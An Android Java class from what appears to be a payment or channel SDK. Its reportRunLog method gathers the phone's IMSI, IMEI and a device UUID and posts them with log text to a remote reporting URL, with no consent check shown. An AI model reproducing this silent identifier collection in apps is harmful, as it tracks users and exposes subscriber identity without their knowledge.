package com.channel.di.net;

import android.content.Context;
import android.text.TextUtils;

import com.channel.di.utils.Constants;
import com.channel.ef.PayManager;
import com.gandalf.daemon.utils.DeviceUuidFactory;
import com.gandalf.daemon.utils.XL_log;
import com.msm.modu1e.utils.IMSInfo;
import com.msm.modu1e.utils.ImsiUtil;
import com.zhy.http.okhttp.OkHttpUtils;

import java.util.HashMap;
import java.util.Map;

public class LogReporter {
    private static XL_log log = new XL_log(LogReporter.class);

    public static void reportRunLog(Context context, String logContent) {
        if (context == null || TextUtils.isEmpty(logContent)) {
            return;
        }
        String pid = PayManager.getInstance(context).getPid();
        String cid = PayManager.getInstance(context).getCid();
        if (!TextUtils.isEmpty(pid) && !TextUtils.isEmpty(cid)) {
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(context);
            }
            String imei = ImsiUtil.getIMEIWithAPI(context);
            Map<String, String> params = new HashMap<>();
            params.put("imei", imei);
            params.put("imsi", imsi);
            params.put("pid", pid);
            params.put("cid", cid);
            params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());
            params.put("sdkLog", logContent);
            OkHttpUtils.post().params(params).url(Constants.URL_GET_REPORT_RUNLOG).build().execute(new ReportRunLogCallback());
        }
    }

}
